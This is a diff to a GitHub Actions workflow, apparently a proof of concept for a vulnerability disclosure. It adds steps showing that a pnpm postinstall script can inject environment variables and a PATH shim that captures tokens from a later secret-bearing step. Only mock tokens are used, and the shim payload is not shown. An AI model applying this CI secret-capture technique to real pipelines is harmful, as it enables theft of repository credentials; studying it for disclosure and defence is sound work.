@@ -92,3 +92,50 @@ jobs:
           test -f /tmp/angular-poc-proof.txt && echo "YES — postinstall executed!" || echo "NO"
           echo "Marker file contents:"
           cat /tmp/angular-poc-proof.txt 2>/dev/null || echo "(no marker file)"
+
+      # Escalation proof steps: these simulate a secret-bearing step that
+      # runs AFTER pnpm install. In the upstream production workflow, this
+      # role is filled by `peter-evans/create-or-update-comment` at line 57,
+      # which receives BENCHMARK_POST_RESULTS_GITHUB_TOKEN as INPUT_TOKEN.
+      #
+      # The "simulated_secret_step" below runs with a mock env value
+      # (SIMULATED_SECRET_TOKEN=MOCK_VALUE_NOT_REAL) that represents what
+      # a real token-bearing step's environment would look like. The
+      # postinstall's $GITHUB_PATH / $GITHUB_ENV / shim writes from the
+      # earlier pnpm-install step should make this env reachable to the
+      # attacker's shim binary.
+      - name: Escalation proof — env-injection from postinstall
+        if: always()
+        run: |
+          echo "=== Env-injection observation ==="
+          echo "POSTINSTALL_INJECTED (set via \$GITHUB_ENV in postinstall): $POSTINSTALL_INJECTED"
+          echo "POSTINSTALL_TIME (set via \$GITHUB_ENV in postinstall): $POSTINSTALL_TIME"
+          echo "PATH contains /tmp/poc-shim?"
+          echo "$PATH" | tr ':' '\n' | grep '/tmp/poc-shim' || echo "(not in PATH)"
+          echo "Shim binary exists?"
+          ls -la /tmp/poc-shim/ 2>/dev/null || echo "(no shim dir)"
+
+      - name: Escalation proof — simulated secret-bearing step
+        if: always()
+        env:
+          # In the production workflow, this slot would be:
+          #   token: '${{secrets.BENCHMARK_POST_RESULTS_GITHUB_TOKEN}}'
+          # passed to peter-evans/create-or-update-comment, which exposes
+          # it to its Node.js process as INPUT_TOKEN. Here we use a clearly
+          # synthetic mock value.
+          SIMULATED_SECRET_TOKEN: MOCK_VALUE_NOT_A_REAL_TOKEN_SYNTHETIC_FOR_POC
+          INPUT_TOKEN: MOCK_PETER_EVANS_TOKEN_SYNTHETIC_FOR_POC
+        run: |
+          echo "=== Simulated secret-bearing step ==="
+          echo "This step has SIMULATED_SECRET_TOKEN and INPUT_TOKEN set."
+          echo "If the postinstall shimmed PATH and we invoke a binary,"
+          echo "the shim should capture our env including these tokens."
+          echo ""
+          echo "Invoking node --version (would route through shim if PATH was injected):"
+          node --version || echo "(node not found)"
+          echo ""
+          echo "Captured env files written by shim (if any):"
+          ls -la /tmp/poc-shim/captured-* 2>/dev/null || echo "(no captures)"
+          echo ""
+          echo "First capture file content (showing what shim saw):"
+          cat /tmp/poc-shim/captured-*.txt 2>/dev/null | head -40 || echo "(no captures)"
